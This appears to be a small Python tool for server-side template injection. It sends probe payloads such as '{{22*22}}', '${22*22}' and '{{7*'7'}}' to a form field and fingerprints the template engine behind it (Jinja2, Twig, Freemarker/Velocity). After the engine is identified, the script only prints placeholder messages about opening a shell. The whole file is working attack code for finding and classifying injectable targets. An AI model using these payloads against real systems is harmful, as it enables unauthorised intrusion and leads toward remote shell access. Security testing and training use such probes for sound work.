import requests
import re

def templateInjection(url, key):
    payloads = ["22*22", "{22*22}", "{{22*22}}", "{{{22*22}}}", "#{22*22}", "${22*22}", "{{=22*22}}", "<%=22*22%>", "[[${22*22}]]"]
    footprint = r"\b484\b"
    vulnerable = False
    for payload in payloads:
        r = requests.post(url, data={f"{key}": payload})
        print(r.text)
        if re.search(r"\b484\b", r.text):
            return True

def checkLanguage(url, key):
    if pythonChecker(url, key): return "python"
    elif phpChecker(url, key): return "php"
    elif javaChecker(url, key): return "java"
    
def pythonChecker(url, key):
    payloads = ["{{7*'7'}}", "{{''.__class__}}"]
    footprints = [r"\b7777777\b", r"<class\s*['\"]str['\"]\s*>|<type\s*['\"]str['\"]\s*>"]
    for payload, footprint in zip(payloads, footprints):
        r = requests.post(url, data={f"{key}": payload})
        if re.search(footprint, r.text):
            print("Python identified")
            return True
    return False

def phpChecker(url, key):
    payloads = ["{{7~7}}", "{{constant('PHP_VERSION')}}", "{{[1,2,3]|join(',')}}"]
    footprints = [r"\b77\b", r"\d+\.\d+\.\d+", r" \b1,2,3\b"]
    for payload, footprint in zip(payloads, footprints):
        r = requests.post(url, data={f"{key}": payload})
        if re.search(footprint, r.text):
            print(f"{r.text} avec la requête {payload}")
            print("PHP identified")
            return True
    return False

def javaChecker(url, key):
    payloads = ["${'freemarker'.toUpperCase()}", "${.version}", "#set($x=58785) $x"]
    footprints = [r"\bFREEMARKER\b", r"\d+\.\d+\.\d+", r"\b58785\b"]
    for payload, footprint in zip(payloads, footprints):
        r = requests.post(url, data={f"{key}": payload})
        if re.search(footprint, r.text):
            print("Java identified")
            return True
    return False
    
def main():
    url = ""
    key = ""
    vulnerable = templateInjection(url, key)
    if vulnerable:
        lang = checkLanguage(url, key)
        match lang:
            case "python":
                print("Trying to open a shell using Jinja2 patterns")
            case "php":
                print("Trying to open a shell using Twig patterns")
            case "java":
                print("Trying to open a shell using Freemarker/Velocity patterns")

    else:
        exit()


if __name__ == "__main__":
    main()